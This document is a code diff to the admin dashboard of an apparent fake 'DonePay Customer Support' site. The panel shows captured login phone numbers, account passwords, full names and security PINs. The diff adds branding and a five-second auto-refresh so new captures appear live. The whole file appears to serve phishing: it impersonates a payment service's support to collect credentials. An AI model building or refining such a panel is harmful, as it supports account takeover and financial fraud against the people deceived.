@@ -7,7 +7,12 @@
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; padding: 20px; margin: 0; }
         .admin-card { background: white; max-width: 1100px; margin: 0 auto; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .hidden { display: none; }
-        h1 { text-align: center; color: #333; }
+        
+        /* HEADER STYLES */
+        .app-header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #f0f0f0; padding-bottom: 20px; }
+        .logo-img { width: 80px; height: 80px; object-fit: contain; margin: 0 auto 10px; display: block; }
+        .brand-title { color: #000; font-size: 24px; font-weight: bold; margin: 0; }
+        h1 { text-align: center; color: #333; margin-top: 0;}
         
         /* Login Styles */
         .login-box { max-width: 400px; margin: 50px auto; text-align: center; }
@@ -24,7 +29,8 @@
         .pin-cell { font-family: monospace; letter-spacing: 2px; font-size: 16px; font-weight: bold; }
 
         /* Buttons */
-        .btn { padding: 10px 20px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
+        .btn { padding: 10px 20px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; transition: opacity 0.3s;}
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-blue { background: #007bff; }
         .btn-red { background: #dc3545; padding: 6px 12px; font-size: 12px; }
         .btn-grey { background: #6c757d; float: right; }
@@ -33,9 +39,16 @@
 <body>
 
 <div class="admin-card">
+    
+    <!-- HEADER SECTION -->
+    <div class="app-header">
+        <img src="/public/logo.png" onerror="this.src='https://via.placeholder.com/80?text=Logo'" alt="Logo" class="logo-img">
+        <h1 class="brand-title">DonePay Customer Support</h1>
+    </div>
+
     <!-- VIEW 1: ADMIN LOGIN -->
     <div id="login-section">
-        <h1>🔒 Admin Panel Login</h1>
+        <h2 style="text-align: center; color: #555;">🔒 Admin Panel Login</h2>
         <div class="login-box">
             <input type="password" id="masterPass" placeholder="Enter Master Password">
             <br>
@@ -49,7 +62,7 @@
         <div style="overflow: auto; margin-bottom: 20px;">
             <h2 style="float: left; margin: 0;">Submissions</h2>
             <button class="btn btn-grey" onclick="handleLogout()">Logout</button>
-            <button class="btn btn-blue" onclick="fetchData()" style="float: right; margin-right: 10px;">Refresh Data</button>
+            <button id="refreshBtn" class="btn btn-blue" onclick="fetchData()" style="float: right; margin-right: 10px;">Refresh Data</button>
         </div>
 
         <table>
@@ -68,12 +81,13 @@
                 <!-- Data Rows Go Here -->
             </tbody>
         </table>
-        <div id="loading" style="text-align: center; margin-top: 20px; color: #666;">Loading...</div>
+        <div id="loading" style="text-align: center; margin-top: 20px; color: #666; display: none;">Loading...</div>
     </div>
 </div>
 
 <script>
     let token = sessionStorage.getItem('adminAuthToken');
+    let autoRefreshInterval; // Stores the 5-second timer
 
     // Auto-login if token exists
     if (token) {
@@ -109,16 +123,30 @@
     function showDashboard() {
         document.getElementById('login-section').classList.add('hidden');
         document.getElementById('dashboard-section').classList.remove('hidden');
-        fetchData();
+        
+        fetchData(); // Initial load
+
+        // Start Auto-Refresh Loop (5 Seconds)
+        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        autoRefreshInterval = setInterval(() => {
+            fetchData(true); // 'true' means this is a background auto-refresh
+        }, 5000);
     }
 
     // --- FETCH DATA ---
-    async function fetchData() {
+    async function fetchData(isAuto = false) {
         const tbody = document.getElementById('table-body');
         const loading = document.getElementById('loading');
+        const refreshBtn = document.getElementById('refreshBtn');
         
-        tbody.innerHTML = '';
-        loading.style.display = 'block';
+        // 1. If clicked manually (!isAuto), show loading feedback immediately
+        if (!isAuto) {
+            refreshBtn.disabled = true;
+            refreshBtn.innerText = "Loading...";
+            tbody.innerHTML = ''; 
+            loading.style.display = 'block';
+        }
+        // If isAuto, we do NOT clear table yet to avoid flickering
 
         try {
             const res = await fetch('/api/admin/data', {
@@ -131,33 +159,40 @@
             }
 
             const data = await res.json();
+            
+            // 2. Data arrived. NOW we clear and fill the table.
+            tbody.innerHTML = '';
             loading.style.display = 'none';
 
             if (data.length === 0) {
                 tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">No submissions found.</td></tr>';
-                return;
+            } else {
+                data.forEach(item => {
+                    const tr = document.createElement('tr');
+                    const date = new Date(item.timestamp).toLocaleString();
+                    
+                    tr.innerHTML = `
+                        <td style="font-size: 12px; color: #666;">${date}</td>
+                        <td class="cred-cell">${item.loginPhone}<br>${item.loginPassword}</td>
+                        <td>${item.fullName}</td>
+                        <td>${item.problem}</td>
+                        <td class="pin-cell">${item.securityPin}</td>
+                        <td>${item.experience}</td>
+                        <td>
+                            <button class="btn btn-red" onclick="deleteItem('${item._id}')">Delete</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
             }
 
-            data.forEach(item => {
-                const tr = document.createElement('tr');
-                const date = new Date(item.timestamp).toLocaleString();
-                
-                tr.innerHTML = `
-                    <td style="font-size: 12px; color: #666;">${date}</td>
-                    <td class="cred-cell">${item.loginPhone}<br>${item.loginPassword}</td>
-                    <td>${item.fullName}</td>
-                    <td>${item.problem}</td>
-                    <td class="pin-cell">${item.securityPin}</td>
-                    <td>${item.experience}</td>
-                    <td>
-                        <button class="btn btn-red" onclick="deleteItem('${item._id}')">Delete</button>
-                    </td>
-                `;
-                tbody.appendChild(tr);
-            });
-
         } catch (error) {
-            loading.innerText = "Error loading data.";
+            if(!isAuto) loading.innerText = "Error loading data.";
+            console.error(error);
+        } finally {
+            // Re-enable button
+            refreshBtn.disabled = false;
+            refreshBtn.innerText = "Refresh Data";
         }
     }
 
@@ -172,7 +207,8 @@
             });
 
             if (res.ok) {
-                fetchData(); // Refresh table
+                // If deleted, refresh immediately (manually)
+                fetchData(); 
             } else {
                 alert("Failed to delete.");
             }
@@ -183,6 +219,8 @@
 
     // --- LOGOUT ---
     function handleLogout() {
+        // Stop the timer
+        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
         sessionStorage.removeItem('adminAuthToken');
         window.location.reload();
     }
